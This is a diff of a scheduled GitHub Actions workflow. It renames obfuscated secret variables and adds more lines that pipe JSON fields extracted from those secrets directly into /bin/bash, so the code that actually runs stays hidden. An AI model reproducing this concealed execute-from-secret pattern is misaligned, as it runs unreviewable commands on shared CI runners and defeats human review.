@@ -3,8 +3,9 @@ name: huawenshenqi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
-jobs:  # 910
+    - cron: '29 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +13,16 @@ jobs:  # 910
       - uses: actions/checkout@v4
       - name: huawenshenqi
         env:
-          c70174: ${{ secrets.c70174 }}
+          zqfe8710: ${{ secrets.zqfe8710 }}
         run: |
-          echo $c70174 | jq -r .g851 | /bin/bash
-          echo $zu33784 | jq -r .eesl7110 | /bin/bash
-          echo $wiyp06 | jq -r .tfpu24133 | /bin/bash
-          echo $ei0522 | jq -r .jgdgx239 | /bin/bash
-          echo $qod6 | jq -r .cyivc8616 | /bin/bash
-          echo $aatc41851 | jq -r .ovd30916 | /bin/bash
-          echo $o548 | jq -r .hlmlo500 | /bin/bash
+          echo $zqfe8710 | jq -r .hoed570 | /bin/bash
+          echo $ahccl56 | jq -r .l435 | /bin/bash
+          echo $vsjp7794 | jq -r .rxe4 | /bin/bash
+          echo $fmdax528 | jq -r .vtt87 | /bin/bash
+          echo $aes1781 | jq -r .kqmy2 | /bin/bash
+          echo $m602 | jq -r .qno43128 | /bin/bash
+          echo $cm8494 | jq -r .fpnak42600 | /bin/bash
+          echo $j0 | jq -r .kbnk27079 | /bin/bash
+          echo $dip74215 | jq -r .bsy5 | /bin/bash
+          echo $vdpw762 | jq -r .rkpqg3243 | /bin/bash
 
